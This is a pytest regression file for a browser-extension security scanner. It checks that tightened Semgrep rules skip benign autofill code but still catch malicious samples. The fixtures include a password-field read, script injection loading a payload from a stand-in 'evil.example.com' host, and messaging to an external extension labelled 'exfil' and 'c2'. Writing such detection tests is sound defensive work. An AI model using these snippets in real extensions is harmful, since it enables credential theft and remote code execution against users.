"""Precision regression for two over-broad CRITICAL custom Semgrep rules.

These rules feed the CRITICAL_SAST hard gate, so a false match hard-BLOCKs a
benign extension (fear-based BLOCK). They were tightened after the Indian Visa
Autofill Pro calibration case, where:

  * credential.theft.password_extraction matched ``getElementById($ID).value``
    (any element value read — the extension reads its OWN form fields for
    autofill, e.g. getElementById("iv-user-email").value), and
  * c2.exfiltration.dynamic_script_loading matched a bare
    ``document.createElement('script')`` even for inline (textContent) page
    bridges that never load remote code.

The rules must still fire on REAL credential extraction (an actual password
field) and REAL remote script loading (a created script element with a remote
.src), so evidence-backed BLOCKs are preserved.
"""

import json
import subprocess
from pathlib import Path

import pytest

from extension_shield.core.analyzers.sast import JavaScriptAnalyzer

RULES = str(
    Path(__file__).resolve().parents[1]
    / "src" / "extension_shield" / "config" / "custom_semgrep_rules.yaml"
)

PW = "password_extraction"
DSL = "dynamic_script_loading"

BENIGN = """
// Autofill reading its own form fields by id (benign) — must NOT fire.
const email = document.getElementById("iv-user-email").value;
const phone = document.getElementById("new-phone").value;
// Inline page-context bridge via textContent (benign) — must NOT fire.
const n = document.createElement("script");
n.textContent = "(function(){ jQuery('#x').val('hi'); })()";
document.body.appendChild(n);
"""

MALICIOUS = """
// Real credential extraction from a password field — MUST fire.
const pw = document.querySelector('input[type="password"]').value;
// Real remote script loading — MUST fire.
const s = document.createElement('script');
s.src = "https://evil.example.com/payload.js";
document.head.appendChild(s);
"""


def _semgrep():
    return JavaScriptAnalyzer._resolve_semgrep_executable()


def _rule_ids(code: str, tmp_path: Path) -> set:
    f = tmp_path / "sample.js"
    f.write_text(code)
    proc = subprocess.run(
        [_semgrep(), "--config", RULES, "--json", "--quiet", str(f)],
        capture_output=True, text=True, timeout=120,
    )
    out = json.loads(proc.stdout or "{}")
    return {r["check_id"].split(".")[-1] for r in out.get("results", [])}


requires_semgrep = pytest.mark.skipif(
    not JavaScriptAnalyzer._is_semgrep_installed(), reason="semgrep not installed"
)


@requires_semgrep
def test_benign_autofill_does_not_trigger_critical_rules(tmp_path):
    ids = _rule_ids(BENIGN, tmp_path)
    assert PW not in ids, f"password_extraction false-fired on benign autofill: {ids}"
    assert DSL not in ids, f"dynamic_script_loading false-fired on inline script: {ids}"


@requires_semgrep
def test_real_credential_theft_and_remote_loading_still_fire(tmp_path):
    ids = _rule_ids(MALICIOUS, tmp_path)
    assert PW in ids, f"password_extraction missed a real password field read: {ids}"
    assert DSL in ids, f"dynamic_script_loading missed real remote script loading: {ids}"


# --- ERROR-rule recalibration (chrome_runtime_external / indexeddb_storage) ----

def _findings(code: str, tmp_path: Path):
    """Return list of (short_check_id, severity) for a code sample."""
    f = tmp_path / "sample.js"
    f.write_text(code)
    proc = subprocess.run(
        [_semgrep(), "--config", RULES, "--json", "--quiet", str(f)],
        capture_output=True, text=True, timeout=120,
    )
    out = json.loads(proc.stdout or "{}")
    return [
        (r["check_id"].split(".")[-1], r.get("extra", {}).get("severity"))
        for r in out.get("results", [])
    ]

CRE = "chrome_runtime_external"

BENIGN_MESSAGING = """
// Normal in-extension messaging: message object + callback. Must NOT be flagged
// as messaging to an external extension.
chrome.runtime.sendMessage({type: "getUserId"}, function (resp) { use(resp); });
chrome.runtime.sendMessage(payload, cb);
const req = indexedDB.open("appdb", 1);
"""

EXTERNAL_MESSAGING = """
// Messaging addressed to an EXTERNAL extension id (32-char store id) — MUST fire.
chrome.runtime.sendMessage("abcdefghijklmnopabcdefghijklmnop", {cmd: "exfil"}, cb);
chrome.runtime.connect("abcdefghijklmnopabcdefghijklmnop", {name: "c2"});
"""


@requires_semgrep
def test_internal_runtime_messaging_is_not_flagged_external(tmp_path):
    ids = {cid for cid, _ in _findings(BENIGN_MESSAGING, tmp_path)}
    assert CRE not in ids, f"chrome_runtime_external false-fired on internal messaging: {ids}"


@requires_semgrep
def test_external_extension_messaging_still_fires(tmp_path):
    ids = {cid for cid, _ in _findings(EXTERNAL_MESSAGING, tmp_path)}
    assert CRE in ids, f"chrome_runtime_external missed real external-extension messaging: {ids}"


@requires_semgrep
def test_indexeddb_storage_is_warning_not_error(tmp_path):
    # Plain IndexedDB use is a capability signal, not a standalone high-risk finding.
    sev = {cid: s for cid, s in _findings(BENIGN_MESSAGING, tmp_path)}
    assert sev.get("indexeddb_storage") == "WARNING", (
        f"indexeddb_storage must be WARNING (capability signal), got: {sev}"
    )
